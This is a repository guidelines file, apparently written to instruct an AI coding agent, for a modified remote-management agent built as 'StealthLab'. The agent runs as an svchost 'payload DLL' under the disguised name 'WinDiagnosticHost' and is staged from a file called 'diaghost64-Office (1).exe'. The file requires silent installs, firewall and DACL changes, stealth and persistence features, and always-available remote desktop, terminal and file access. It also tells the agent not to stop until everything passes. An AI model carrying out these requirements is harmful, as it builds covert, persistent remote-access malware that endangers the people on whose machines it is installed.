# Repository Guidelines

## Project Structure & Module Organization
- `meshcore/` hosts the cross-platform agent runtime; generated headers live in `meshcore/generated/`.
- `meshservice/` contains Windows service projects, with `MeshService-2022` carrying the svchost and standalone builds (`StealthLab`, `StealthLab_DLL`).
- `modules/` contains JavaScript runtime modules (installer/service manager logic lives here).
- `docs/testing/` stores validation evidence, plans, and packaged artifacts (`docs/testing/artifacts/`).

## Build, Test, and Development Commands
- `msbuild meshservice\MeshService-2022.vcxproj /p:Configuration=StealthLab_DLL /p:Platform=x64 /m` - build the svchost payload DLL.
- `msbuild meshservice\MeshService-2022.vcxproj /p:Configuration=StealthLab /p:Platform=x64 /m` - build the standalone executable.

## Implementation Constraints (Must Follow)
- Implement install/uninstall/update logic in native C/C++ and JavaScript only.
- Do not use PowerShell scripts for install/uninstall/update or regression testing.
- Do not add new PowerShell scripts for these workflows.
- Legacy PowerShell tooling may exist in `tools/`, but it is not to be used for runtime logic or test automation.

## Engineering Quality Bar (Non-Negotiable)
- No shortcuts, hacks, temporary fixes, or workarounds.
- No technical debt, code smells, regressions, or hidden edge-case failures.
- Fix root causes holistically; consider dependencies and side effects.
- Logic must be defensive, secure, maintainable, and production-ready.
- Include proper validation, error handling, logging, and observability.
- Explicitly consider performance, reliability, and future extensibility.
- Treat all work as production-critical; anticipate failure modes and edge cases.
- Implement end-to-end fixes comprehensively; do not ship partial solutions.

## Install & Logs
- Install root: `C:\ProgramData\DiagnosticHost`
- Log root: `C:\ProgramData\DiagnosticHost\logs`
- Installer log: `C:\ProgramData\DiagnosticHost\logs\installer.log`
## Connectivity Inputs
- `.msh` source: `C:\Users\Workstation\Downloads\diaghost64-Office (1).exe` (extract and stage for installs/updates).
- The agent must connect to the configured server using the staged `.msh` (ServerID + TLS hash).
## Runtime Scope (Must Support)
- Service mode only (no interactive user-mode installs).
- Installer must support silent/quiet non-interactive deployment mode for service installs/updates.
- Disable standalone agent execution; only svchost service mode is allowed.
- Remote desktop (KVM/RDP) must always be available when the service is running.
- Terminal and file operations are expected to work, but are not part of routine regression unless investigating a major bug.
- Stealth/persistence features must remain enabled and validated end-to-end.
- Server connectivity must be established after install/update and persist across restarts.

## Functional Requirements (Must Enforce)
- Install/uninstall/update must correctly handle registry entries, firewall rules, DACLs, and persistence artifacts.
- Silent/quiet install mode must complete end-to-end with the same registry/firewall/DACL/persistence guarantees as interactive flows.
- PowerShell-invoked install entry must be supported for operators, but it must call native installer code paths only (no PowerShell runtime/install logic).
- Agent must run only in service mode using svchost.
- Remote desktop (KVM/RDP) session availability must be continuous while the service is running, including after restart and update.
- Terminal access and file operations are verified only when investigating major bugs or regressions.
- Failures in any of the above are regressions and must block completion.

## Coding Style & Naming Conventions
- C/C++ sources follow 4-space indentation, all-lowercase file names with underscores, and brace-on-same-line (see `meshservice/stealth_installer.c`).
- JavaScript follows existing project style (see `modules/service-manager.js`).
- Generated branding files (`branding_config*.json`, `meshagent_branding.h`) should not be hand-edited; use existing tooling under `tools/` if needed.

## Testing Guidelines
- Provide end-to-end regression coverage for install/uninstall/update, including registry, firewall, DACL, persistence behavior, WMI, and agent network persistence.
- Include silent/quiet install and PowerShell-invoked install entrypoint validation in regression coverage.
- Validate service-only behavior, svchost mode, and server connectivity/handshake using the staged `.msh` (ServerID/TLS hash).
- Do not run routine KVM/RDP/WebRTC/terminal/file transfer checks; only run them when investigating a major bug or regression.
- Session checks are disabled by default in `agent-selftest`; use `--majorBug=1` only when explicitly investigating major bugs.
- Do not alter terminal/KVM/remote desktop runtime behavior unless explicitly requested.
- Prefer native C/C++ validation helpers and JS harnesses over scripts.
- Store validation evidence in `docs/testing/` and packaged artifacts in `docs/testing/artifacts/`.
- Regression must explicitly prove install/uninstall/update, registry, firewall, DACL, persistence, WMI, network persistence, and svchost-only service mode.

## Advanced Debugging & Harness (Required)
- Use all locally available advanced debugging/diagnostic tooling for deep bug analysis, regression, and stress validation.
- If required tools are missing or stale, install/upgrade them before debugging using package-managed updates (do not skip tool refresh).
- Mandatory refresh/install commands:
- `winget install --id Microsoft.Sysinternals.Suite -e --accept-package-agreements --accept-source-agreements`
- `winget install --id Microsoft.WinDbg -e --accept-package-agreements --accept-source-agreements`
- `winget upgrade --id Microsoft.Sysinternals.Suite -e --accept-package-agreements --accept-source-agreements`
- `winget upgrade --id Microsoft.WinDbg -e --accept-package-agreements --accept-source-agreements`
- Native primary target path: `meshservice\x64\StealthLab\MeshService-2022.exe` (install/update/uninstall/validate/fullregression entrypoint).
- Svchost payload path: `meshservice\x64\StealthLab_DLL\MeshService-2022.dll`.
- Installer validation binary path: `meshservice\installer\dist\x64\MeshServiceInstaller64.exe`.
- JS regression harness path: `modules\agent-selftest.js`.
- Update stress harness path: `test\update-test.js`.
- Current local advanced tooling paths:
- `C:\Users\Workstation\AppData\Local\Microsoft\WindowsApps\WinDbgX.exe`
- `C:\Users\Workstation\AppData\Local\Microsoft\WinGet\Links\Procmon.exe`
- `C:\Users\Workstation\AppData\Local\Microsoft\WinGet\Links\procdump.exe`
- `C:\Windows\System32\wpr.exe`
- `C:\Program Files (x86)\Windows Kits\10\Windows Performance Toolkit\wpa.exe`
- `C:\Program Files (x86)\Windows Kits\10\Windows Performance Toolkit\xperf.exe`
- `C:\Windows\System32\PktMon.exe`
- `C:\Windows\System32\netsh.exe`
- Authoritative advanced debugging workflow reference: `docs/testing/ADVANCED_DEBUG_TOOLCHAIN.md`.
- Legacy docs under `docs/testing/*.md` are historical context only and may be outdated; do not treat them as authoritative for current debugging/regression.
- Record run commands, parameters, and outcomes for each debug/regression/stress run under `docs/testing/`.
- Evidence/log output paths must include `docs/testing/native-regression.log`, `docs/testing/native-install.log`, `docs/testing/evidence/`, `docs/testing/artifacts/`, and `C:\ProgramData\DiagnosticHost\logs\installer.log`.

## End-to-End Fix Plan (Must Complete)
1. Audit current install/uninstall/update paths for bugs, gaps, and code smells (registry, firewall, DACL, persistence, service mode).
2. Implement native C/C++ fixes for all identified gaps (no PowerShell usage in runtime logic).
3. Implement native validation commands: install, update, uninstall, and service-state validation (registry + firewall + DACL + persistence + service configuration).
4. Extract `.msh` payload from `C:\Users\Workstation\Downloads\diaghost64-Office (1).exe` and validate it against the runtime expectations.
5. Ensure install/update staging logic writes the `.msh` (and `.conf`) into the install root and preserves ServerID/TLS hash.
6. Wire JS regression harness to drive full install → validate → restart → server-connect → update → validate → uninstall → validate sequence, covering WMI, persistence, registry, firewall, network persistence, and svchost-only service mode.
7. Ensure logging and JSON evidence capture for each phase under `docs/testing/`.
8. Run full end-to-end regression and attach evidence (no stopping before tests pass).

## Execution Rules
- Do not stop work until all fixes are implemented and full regression is executed.
- No PowerShell scripts or PowerShell execution in install/uninstall/update/regression paths.
- Completion is blocked until service-only svchost mode, install/uninstall/update, registry, firewall, DACL, persistence, WMI, network persistence, and server connectivity pass end-to-end.

## Commit & Pull Request Guidelines
- Use concise, imperative subjects (`Fix svchost service creation`) and include context in the body where necessary (reasoning, risk, testing).
- Reference tracking issues with `Fixes #ID` when applicable, and attach updated evidence or artifact links in the PR description.
- PRs should include: summary, testing steps/outputs, and any required operator actions (e.g., service restart).

## Security & Operational Notes
- Always validate binaries with `tools/SignerAllowlist.ps1` before publishing; unauthorized certificates must be blocked.
- Deployment actions touch `HKLM` and firewall rules—run only from elevated shells and document logs for traceability.
- Before packaging releases, export the latest evidence bundle (`docs/testing/artifacts/*.zip`) and attach it to the GitHub release for downstream auditors.
- Mirror release hand-offs with the quick checklist in `docs/files/meshagent_release_checklist.md` and attach verification artifacts (verify-log/report, digests) to each deployment record.

## Audit Record (2026-02-25)
- Tool refresh commands executed:
- `winget install --id Microsoft.Sysinternals.Suite -e --accept-package-agreements --accept-source-agreements`
- `winget install --id Microsoft.WinDbg -e --accept-package-agreements --accept-source-agreements`
- `winget upgrade --id Microsoft.Sysinternals.Suite -e --accept-package-agreements --accept-source-agreements`
- `winget upgrade --id Microsoft.WinDbg -e --accept-package-agreements --accept-source-agreements`
- Result: toolchains already current (no newer package versions available from configured sources).
- Native self-test/harness fixes completed:
- `modules/agent-selftest.js`: restored stable remote `toAgent` routing via console/eval path for remote IPC commands.
- `modules/agent-selftest.js`: fixed tunnel promise ownership race by using `_owner` for queue cleanup and removing conflicting `parent` overwrite in `testTunnel`.
- `modules/agent-selftest.js`: added defensive tunnel send failure handling (`send-failed`) to prevent hung tunnel promises.
- `modules/agent-selftest.js`: made LMS no-AMT resolution asynchronous to avoid intermittent promise-chain stalls after `testLMS [N/A]`.
- `meshcore/agentcore.c`: self-test flag handling is now case-safe (`selfTest` and `selftest`) and cleared before execution to prevent re-entrant duplicate self-test runs.
- `meshcore/agentcore.c`: added in-memory `selfTestLaunched` one-shot guard to block repeated self-test re-entry from reconnect paths.
- `meshcore/agentcore.c`: self-test now stages `agent-selftest.js` for the currently running executable path before loading, preventing `Module: agent-selftest (NOT FOUND)` on repo-binary self-test runs.
- `meshcore/agentcore.c`: `--selftest` now prefers the installed runtime `.db` path in read-only mode (with local fallback), preventing stale dev-db `CoreModule` parse failures during repo-binary major-bug diagnostics.
- Latest passing native full regression evidence:
- `docs/testing/evidence/advanced/20260225_051820_fullregression_final_after_uninstall_exit_fix/summary.txt` (`EXIT_CODE=0`).
- `docs/testing/evidence/advanced/20260225_074058_fullregression_post_selftest_stage_fix/summary.txt` (`EXIT_CODE=0`).
- `docs/testing/evidence/advanced/20260225_075039_fullregression_post_dbpath_fix/summary.txt` (`EXIT_CODE=0`).
- `docs/testing/evidence/advanced/20260225_075540_fullregression_post_const_fix/summary.txt` (`EXIT_CODE=0`).
- `docs/testing/evidence/advanced/20260225_080058_fullregression_post_warning_fix/summary.txt` (`EXIT_CODE=0`).
- CLI coverage evidence (help/install/update/uninstall/validation/svchost):
- `docs/testing/evidence/advanced/20260225_051440_cli_coverage_final_post_uninstall_exit_fix/summary.txt` (`ALL_OK=True`).
- `docs/testing/evidence/advanced/20260225_072604_cli_coverage_live/summary.txt` (`ALL_OK=True`).
- Major-bug session/KVM verification evidence:
- `docs/testing/evidence/advanced/20260225_050932_majorbug_post_timeout_hardening/summary.txt` (`EXIT_CODE=0`).
- `docs/testing/evidence/advanced/20260225_074721_majorbug_repoexe_after_dbpath_fix/summary.txt` (`EXIT_CODE=0`).
- Runtime state after final install restore:
- `docs/testing/evidence/advanced/20260225_052102_final_runtime_restore_final/summary.txt` (`INSTALL_EXIT=0`, `VALIDATE_EXIT=0`, `SVCHOST_STATUS_EXIT=0`).
- `docs/testing/evidence/advanced/20260225_074412_final_runtime_restore_post_selftest_stage_fix/summary.txt` (`INSTALL_EXIT=0`, `VALIDATE_EXIT=0`, `SVCHOST_STATUS_EXIT=0`, `SC_QUERY_EXIT=0`).
- `docs/testing/evidence/advanced/20260225_075316_final_runtime_restore_post_dbpath_fix/summary.txt` (`INSTALL_EXIT=0`, `VALIDATE_EXIT=0`, `SVCHOST_STATUS_EXIT=0`, `SC_QUERY_EXIT=0`).
- `docs/testing/evidence/advanced/20260225_075819_final_runtime_restore_post_const_fix/summary.txt` (`INSTALL_EXIT=0`, `VALIDATE_EXIT=0`, `SVCHOST_STATUS_EXIT=0`, `SC_QUERY_EXIT=0`).
- `docs/testing/evidence/advanced/20260225_080347_final_runtime_restore_post_warning_fix/summary.txt` (`INSTALL_EXIT=0`, `VALIDATE_EXIT=0`, `SVCHOST_STATUS_EXIT=0`, `SC_QUERY_EXIT=0`).
- `-validate-install` passed and `-svchost-status` confirms `WinDiagnosticHost` running in svchost mode (`netsvcs`, `ServiceDllHash match: yes`).
